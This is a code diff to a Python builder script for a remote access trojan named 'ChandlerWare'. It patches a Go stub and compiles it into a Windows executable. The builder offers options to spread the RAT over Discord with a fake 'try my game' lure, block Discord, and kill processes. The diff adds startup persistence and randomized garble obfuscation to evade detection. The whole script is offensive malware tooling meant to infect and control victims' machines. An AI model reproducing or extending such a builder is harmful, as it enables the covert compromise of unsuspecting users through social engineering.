@@ -44,6 +44,8 @@ if spread:
     spread_msg = input(f"{QUESTION} Spread Message (Will contain RAT executable): ")
 
 block = input(f"{QUESTION} Block discord (y/n): ").lower() == "y" or False
+kill = input(f"{QUESTION} Kill processes (y/n): ").lower() == "y" or False
+startup = input(f"{QUESTION} Start on startup (y/n): ").lower() == "y" or False
 obfuscate = input(f"{QUESTION} Obfuscate (y/n): ").lower() == "y" or False
 
 
@@ -56,6 +58,10 @@ if spread:
     content = content.replace("spread_msg", spread_msg != "" and spread_msg or "I just made this game please try it! (I need feedback lol)")
 if block:
     content = content.replace("BLOCK       = false", "BLOCK = true")
+if kill:
+    content = content.replace("KILL        = false", "KILL = true")
+if startup:
+    content = content.replace("STARTUP     = false", "STARTUP = true")
 
 print(f"{INFO} Creating output directory...")
 
@@ -67,6 +73,7 @@ print(f"{INFO} Writing stub.go...")
 if os.path.exists("tmp/stub.go"):
     os.remove("tmp/stub.go")
 
+print(f"{INFO} Writing utils.go...")
 # same as above but for utils.go
 if os.path.exists("tmp/utils.go"):
     os.remove("tmp/utils.go")
@@ -82,12 +89,15 @@ if obfuscate:
         print(f"{ERROR} Garble is not installed, installing...")
         subprocess.call("go install mvdan.cc/garble@latest")
     print(f"{INFO} Obfuscating...")
-    subprocess.call("garble build -o output/ChandlerWare.exe tmp/utils.go tmp/new_stub.go")
+    subprocess.call("garble -seed=random -debug build -o output/ChandlerWare.exe tmp/utils.go tmp/new_stub.go")
     print(f"{INFO} Obfuscation complete!")
 else:
     print(f"{INFO} Building...")
     os.system("go build -o output/ChandlerWare.exe tmp/utils.go tmp/new_stub.go")
     print(f"{INFO} Build complete!")
+
+print(f"{INFO} Cleaning up...")
+print(f"{INFO} Done!")
 
 
 
